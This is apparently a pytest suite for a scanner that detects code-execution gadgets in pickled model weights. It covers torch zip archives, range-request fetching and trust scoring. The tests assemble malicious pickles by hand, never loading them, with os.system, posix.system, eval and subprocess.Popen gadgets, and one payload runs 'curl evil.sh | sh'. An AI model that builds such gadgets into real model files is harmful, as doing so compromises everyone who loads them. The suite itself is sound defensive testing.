"""
Tests for pickle opcode analysis.

Every "malicious" pickle here is *assembled*, never loaded. The bytes are
written by hand or by pickle.dumps (which serialises without executing), and
the scanner only ever reads them back through pickletools. Nothing in this
file can run the payloads it constructs — which is the same property the
scanner itself relies on.
"""

import io
import zipfile

import httpx
import pytest

from app.fetcher.pickle_fetch import HttpRangeFile, extract_streams
from app.scanner.pickle_scanner import (
    PickleStream,
    analyse_stream,
    check_weight_formats,
    iter_pickle_streams,
    scan_pickle_streams,
)
from app.scanner.static_scanner import calculate_trust_score


# ── Pickle assembly helpers ───────────────────────────────────────────────────
# Opcodes: c = GLOBAL, X = BINUNICODE, \x85 = TUPLE1, R = REDUCE, . = STOP,
# \x8c = SHORT_BINUNICODE, \x93 = STACK_GLOBAL, } = EMPTY_DICT.

def _global(module: str, name: str) -> bytes:
    return b"c" + module.encode() + b"\n" + name.encode() + b"\n"


def _unicode(text: str) -> bytes:
    raw = text.encode()
    return b"X" + len(raw).to_bytes(4, "little") + raw


def _proto2(body: bytes) -> bytes:
    return b"\x80\x02" + body + b"."


def _reduce_call(module: str, name: str, arg: str) -> bytes:
    """The classic gadget: import a callable, push an argument, REDUCE."""
    return _proto2(_global(module, name) + _unicode(arg) + b"\x85R")


def _names(matches):
    return {m.pattern_name for m in matches}


# ── The exploit shape ─────────────────────────────────────────────────────────

def test_os_system_gadget_is_caught():
    stream = PickleStream("pytorch_model.bin", _reduce_call("os", "system", "curl evil.sh | sh"))
    matches = analyse_stream(stream)
    assert "pickle_rce_gadget" in _names(matches)
    finding = next(m for m in matches if m.pattern_name == "pickle_rce_gadget")
    assert finding.malware_grade is True
    assert "os.system" in finding.description


def test_posix_backend_is_caught_like_os():
    """posix.system IS os.system — naming the backend is the oldest bypass."""
    stream = PickleStream("model.pkl", _reduce_call("posix", "system", "id"))
    assert "pickle_rce_gadget" in _names(analyse_stream(stream))


def test_builtins_eval_is_caught():
    stream = PickleStream("model.pkl", _reduce_call("builtins", "eval", "__import__('os')"))
    assert "pickle_rce_gadget" in _names(analyse_stream(stream))


def test_stack_global_protocol_4_is_resolved():
    """Protocol 4 takes the module and name off the stack, not from the arg."""
    body = (
        b"\x8c\x05posix"
        b"\x8c\x06system"
        b"\x93"
        + _unicode("id")
        + b"\x85R"
    )
    stream = PickleStream("model.pt", b"\x80\x04" + body + b".")
    assert "pickle_rce_gadget" in _names(analyse_stream(stream))


def test_subprocess_is_caught():
    stream = PickleStream("model.pkl", _reduce_call("subprocess", "Popen", "sh"))
    assert "pickle_rce_gadget" in _names(analyse_stream(stream))


# ── The benign shapes that must stay quiet ────────────────────────────────────

def test_ordinary_state_dict_is_clean():
    """torch._utils + collections is what a real checkpoint looks like."""
    body = (
        _global("collections", "OrderedDict")
        + _global("torch._utils", "_rebuild_tensor_v2")
        + b"}"
    )
    assert analyse_stream(PickleStream("pytorch_model.bin", _proto2(body))) == []


def test_codecs_encode_is_not_flagged():
    """numpy round-trips bytes through _codecs.encode; it cannot execute alone."""
    body = _global("_codecs", "encode") + _global("numpy.core.multiarray", "_reconstruct")
    assert analyse_stream(PickleStream("weights.pkl", _proto2(body))) == []


def test_plain_data_pickle_is_clean():
    import pickle
    payload = pickle.dumps({"layer.0.weight": [1, 2, 3], "epoch": 4})
    assert analyse_stream(PickleStream("state.pkl", payload)) == []


def test_repo_own_class_is_reported_but_not_malware():
    """Unknown is not malicious — a repo pickling its own classes is normal."""
    body = _global("mypkg.layers", "CustomBlock") + b"}"
    matches = analyse_stream(PickleStream("model.pkl", _proto2(body)))
    assert _names(matches) == {"pickle_unexpected_global"}
    assert matches[0].malware_grade is False
    assert matches[0].severity < 55


def test_dangerous_global_outranks_unknown_global():
    body = _global("mypkg.layers", "CustomBlock") + _global("os", "system")
    matches = analyse_stream(PickleStream("model.pkl", _proto2(body)))
    assert _names(matches) == {"pickle_rce_gadget"}


# ── Malformed and truncated streams ───────────────────────────────────────────

def test_malformed_pickle_is_reported():
    stream = PickleStream("model.pkl", b"\x80\x02c" + b"os")  # GLOBAL with no newline
    assert "pickle_malformed" in _names(analyse_stream(stream))


def test_truncation_we_caused_is_not_blamed_on_the_file():
    stream = PickleStream("huge.bin", b"\x80\x02c" + b"os", truncated=True)
    assert "pickle_malformed" not in _names(analyse_stream(stream))


def test_partial_coverage_is_disclosed():
    """A file we only half-read must not look like a file we cleared."""
    body = _global("collections", "OrderedDict") + b"}"
    stream = PickleStream("huge.bin", _proto2(body), truncated=True)
    matches = analyse_stream(stream)
    assert "pickle_partial_scan" in _names(matches)
    assert calculate_trust_score(matches) >= 90  # a caveat, not an accusation


def test_full_read_makes_no_coverage_claim():
    body = _global("collections", "OrderedDict") + b"}"
    assert analyse_stream(PickleStream("small.pkl", _proto2(body))) == []


def test_non_pickle_bytes_yield_no_stream():
    """A .bin that is actually GGUF or raw tensors is not our problem."""
    assert list(iter_pickle_streams(b"GGUF\x00\x00\x00\x03rest", "model.bin")) == []


# ── Torch zip archives ────────────────────────────────────────────────────────

def _torch_zip(pickle_bytes: bytes, tensor_padding: int = 0) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        zf.writestr("archive/data.pkl", pickle_bytes)
        if tensor_padding:
            zf.writestr("archive/data/0", b"\x00" * tensor_padding)
    return buf.getvalue()


def test_pickle_inside_torch_archive_is_found():
    blob = _torch_zip(_reduce_call("os", "system", "id"))
    streams = list(iter_pickle_streams(blob, "pytorch_model.bin"))
    assert len(streams) == 1
    assert streams[0].member == "archive/data.pkl"
    assert "pickle_rce_gadget" in _names(scan_pickle_streams(streams))


def test_archive_label_names_the_member():
    blob = _torch_zip(_reduce_call("os", "system", "id"))
    matches = scan_pickle_streams(list(iter_pickle_streams(blob, "model.pt")))
    assert matches[0].file_path == "model.pt::archive/data.pkl"


# ── Range-request retrieval ───────────────────────────────────────────────────

def _range_server(blob: bytes, support_ranges: bool = True):
    """A mock origin that honours Range, recording how many bytes it served."""
    served = {"bytes": 0}

    def handler(request: httpx.Request) -> httpx.Response:
        rng = request.headers.get("Range")
        if support_ranges and rng and rng.startswith("bytes="):
            start, _, end = rng.removeprefix("bytes=").partition("-")
            lo = int(start)
            hi = min(int(end), len(blob) - 1) if end else len(blob) - 1
            chunk = blob[lo:hi + 1]
            served["bytes"] += len(chunk)
            return httpx.Response(
                206, content=chunk,
                headers={"Content-Range": f"bytes {lo}-{hi}/{len(blob)}"},
            )
        served["bytes"] += len(blob)
        return httpx.Response(200, content=blob)

    return handler, served


def test_range_read_pulls_only_the_pickle_member_from_a_large_archive():
    """The whole point: read data.pkl out of a big checkpoint, not the tensors."""
    blob = _torch_zip(_reduce_call("os", "system", "id"), tensor_padding=4 * 1024 * 1024)
    handler, served = _range_server(blob)

    with httpx.Client(transport=httpx.MockTransport(handler)) as client:
        streams = extract_streams(client, "https://example.test/model.bin",
                                  "pytorch_model.bin", len(blob))

    assert "pickle_rce_gadget" in _names(scan_pickle_streams(streams))
    # We must not have paid for the 4 MB of tensor storage.
    assert served["bytes"] < len(blob) // 2


def test_falls_back_to_whole_download_when_ranges_unsupported():
    blob = _torch_zip(_reduce_call("os", "system", "id"))
    handler, _ = _range_server(blob, support_ranges=False)

    with httpx.Client(transport=httpx.MockTransport(handler)) as client:
        streams = extract_streams(client, "https://example.test/model.bin",
                                  "pytorch_model.bin", len(blob))

    assert "pickle_rce_gadget" in _names(scan_pickle_streams(streams))


def test_range_file_respects_its_budget():
    blob = b"\x00" * 4096
    handler, _ = _range_server(blob)
    with httpx.Client(transport=httpx.MockTransport(handler)) as client:
        handle = HttpRangeFile(client, "https://example.test/f", len(blob), budget=100)
        with pytest.raises(IOError):
            handle.read(4096)


def test_probe_failure_is_not_fatal():
    def handler(request):
        return httpx.Response(404)

    with httpx.Client(transport=httpx.MockTransport(handler)) as client:
        assert extract_streams(client, "https://example.test/x", "model.bin", 10) == []


# ── Weight-format hygiene ─────────────────────────────────────────────────────

def test_pickle_only_weights_are_flagged():
    matches = check_weight_formats(["config.json", "pytorch_model.bin"])
    assert _names(matches) == {"pickle_only_weights"}


def test_safetensors_alongside_pickle_clears_the_flag():
    assert check_weight_formats(
        ["pytorch_model.bin", "model.safetensors", "config.json"]
    ) == []


def test_repo_without_weights_is_not_flagged():
    assert check_weight_formats(["README.md", "train.py"]) == []


# ── Scoring integration ───────────────────────────────────────────────────────

def test_pickle_gadget_alone_makes_a_repo_dangerous():
    matches = analyse_stream(
        PickleStream("pytorch_model.bin", _reduce_call("os", "system", "id"))
    )
    assert calculate_trust_score(matches) == 15


def test_pickle_only_weights_alone_does_not_condemn_a_repo():
    """Shipping .bin without safetensors is a nudge, not a verdict."""
    matches = check_weight_formats(["pytorch_model.bin"])
    assert calculate_trust_score(matches) >= 90
